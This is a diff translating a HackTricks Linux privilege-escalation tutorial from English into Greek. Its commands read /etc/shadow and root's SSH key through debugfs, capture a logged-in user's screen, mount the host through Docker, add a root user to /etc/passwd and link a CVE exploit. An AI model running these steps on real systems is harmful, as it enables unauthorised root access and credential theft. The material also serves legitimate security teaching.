@@ -1,25 +1,24 @@
-# Interesting Groups - Linux Privesc
+# Ενδιαφέρουσες Ομάδες - Προνομιούχα Ανέλιξη στο Linux
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## Sudo/Admin Groups
+## Ομάδες Sudo/Admin
 
-### **PE - Method 1**
+### **PE - Μέθοδος 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**Μερικές φορές**, **από προεπιλογή (ή επειδή κάποιο λογισμικό το απαιτεί)** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε μερικές από αυτές τις γραμμές:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,47 +26,36 @@ Other ways to support HackTricks:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Αν αυτό ισχύει, για να **γίνετε root μπορείτε απλά να εκτελέσετε**:
 ```
 sudo su
 ```
+### Ανόδου Προνομιών - Μέθοδος 2
 
-### PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Βρείτε όλα τα suid δυαδικά αρχεία και ελέγξτε αν υπάρχει το δυαδικό αρχείο **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+Εάν ανακαλύψετε ότι το δυαδικό **pkexec είναι ένα SUID δυαδικό** και ανήκετε στις ομάδες **sudo** ή **admin**, πιθανώς μπορείτε να εκτελέσετε δυαδικά ως sudo χρησιμοποιώντας το `pkexec`.\
+Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες που υπάρχουν μέσα στην **πολιτική polkit**. Αυτή η πολιτική αναγνωρίζει ποιες ομάδες μπορούν να χρησιμοποιήσουν το `pkexec`. Ελέγξτε το με:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Εκεί θα βρείτε ποιες ομάδες έχουν τη δυνατότητα να εκτελέσουν τις εντολές **pkexec** και **από προεπιλογή** σε ορισμένες διανομές Linux εμφανίζονται οι ομάδες **sudo** και **admin**.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+Για να **γίνετε root μπορείτε να εκτελέσετε**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Εάν προσπαθήσετε να εκτελέσετε την εντολή **pkexec** και λάβετε αυτό το **σφάλμα**:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
+**Δεν είναι επειδή δεν έχετε δικαιώματα, αλλά επειδή δεν είστε συνδεδεμένοι χωρίς γραφικό περιβάλλον**. Και υπάρχει μια λύση για αυτό το πρόβλημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές συνεδρίες ssh**:
 
 {% code title="session1" %}
 ```bash
@@ -75,8 +63,6 @@ echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
 #Step 5, if correctly authenticate, you will have a root session
 ```
-{% endcode %}
-
 {% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
@@ -84,38 +70,31 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 {% endcode %}
 
-## Wheel Group
+## Ομάδα Wheel
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+Μερικές φορές, από προεπιλογή μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε αυτήν τη γραμμή:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα wheel μπορεί να εκτελέσει οτιδήποτε ως sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Αν αυτό ισχύει, για να **γίνετε root μπορείτε απλά να εκτελέσετε**:
 ```
 sudo su
 ```
+## Ομάδα Shadow
 
-## Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+Οι χρήστες από την **ομάδα shadow** μπορούν να **διαβάσουν** το αρχείο **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Διαβάστε το αρχείο και προσπαθήστε να **αποκρυπτογραφήσετε μερικά hashes**.
 
-So, read the file and try to **crack some hashes**.
+## Ομάδα Δίσκου
 
-## Disk Group
+Αυτό το προνόμιο είναι σχεδόν **ισοδύναμο με την πρόσβαση ως root** καθώς μπορείτε να έχετε πρόσβαση σε όλα τα δεδομένα μέσα στη μηχανή.
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+Αρχεία: `/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -124,57 +103,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Σημείωση ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **εγγράψετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+Ωστόσο, αν προσπαθήσετε να **εγγράψετε αρχεία που ανήκουν στο χρήστη root** (όπως το `/etc/shadow` ή το `/etc/passwd`), θα λάβετε ένα σφάλμα "**Άρνηση πρόσβασης**".
 
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+## Ομάδα Video
 
-## Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει ένα αποτέλεσμα όπως το παρακάτω:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος φυσικά** σε ένα τερματικό στο μηχάνημα.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+Η **ομάδα video** έχει πρόσβαση για να παρακολουθήσει την οθόνη εξόδου. Βασικά μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό, χρειάζεται να **αποκτήσετε την τρέχουσα εικόνα της οθόνης** σε ακατέργαστα δεδομένα και να πάρετε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+Για να ανοίξετε την ακατέργαστη εικόνα, μπορείτε να χρησιμοποιήσετε το GIMP, επιλέξτε το αρχείο `screen.raw` και επιλέξτε ως τύπο αρχείου **Raw image data**:
 
 ![](<../../../.gitbook/assets/image (287) (1).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+Στη συνέχεια, τροποποιήστε το Πλάτος και το Ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και ελέγξτε διάφορους Τύπους Εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη):
 
 ![](<../../../.gitbook/assets/image (288).png>)
 
-## Root Group
+## Ομάδα Root
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Φαίνεται ότι από προεπιλογή, τα μέλη της ομάδας root μπορούν να έχουν πρόσβαση για να τροποποιήσουν ορισμένα αρχεία ρυθμίσεων υπηρεσιών ή ορισμένα αρχεία βιβλιοθηκών ή άλλα ενδιαφέροντα πράγματα που μπορούν να χρησιμοποιηθούν για να αναβαθμιστούν τα δικαιώματα...
 
-**Check which files root members can modify**:
-
+**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+## Ομάδα Docker
 
-## Docker Group
-
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+Μπορείτε να **προσαρτήσετε το αρχείοσύστημα της ρίζας του κεντρικού υπολογιστή σε έναν τόμο της εικόνας**, έτσι ώστε όταν ξεκινά η εικόνα, φορτώνει αμέσως ένα `chroot` σε αυτόν τον τόμο. Αυτό σας δίνει αποτελεσματικά δικαιώματα root στον υπολογιστή.
 ```bash
 docker image #Get images from the docker service
 
@@ -186,45 +155,44 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+Τέλος, αν δεν σας αρέσει καμία από τις προτάσεις που αναφέρθηκαν προηγουμένως, ή αν δεν λειτουργούν για κάποιο λόγο (π.χ. προστασία της πρόσβασης στο docker api), μπορείτε πάντα να **εκτελέσετε ένα προνομιούχο container και να δραπετεύσετε από αυτό**, όπως εξηγείται εδώ:
 
 {% content-ref url="../docker-security/" %}
 [docker-security](../docker-security/)
 {% endcontent-ref %}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+Αν έχετε δικαιώματα εγγραφής στον docker socket, διαβάστε [**αυτή την ανάρτηση για το πώς να αναβαθμίσετε τα δικαιώματα κατάχρησης του docker socket**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## Ομάδα lxc/lxd
 
 {% content-ref url="./" %}
 [.](./)
 {% endcontent-ref %}
 
-## Adm Group
+## Ομάδα Adm
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+Συνήθως τα μέλη της ομάδας **`adm`** έχουν δικαιώματα για **ανάγνωση αρχείων καταγραφής** που βρίσκονται μέσα στον φάκελο _/var/log/_.\
+Επομένως, αν έχετε παραβιάσει έναν χρήστη μέσα σε αυτήν την ομάδα, οπωσδήποτε πρέπει να **ελέγξετε τα αρχεία καταγραφής**.
 
-## Auth group
+## Ομάδα Auth
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Στο OpenBSD, συνήθως η ομάδα **auth** μπορεί να γράψει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
+Αυτά τα δικαιώματα μπορούν να καταχραστούν με την ακόλουθη εκμετάλλευση για να **αναβαθμίσετε τα δικαιώματα** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
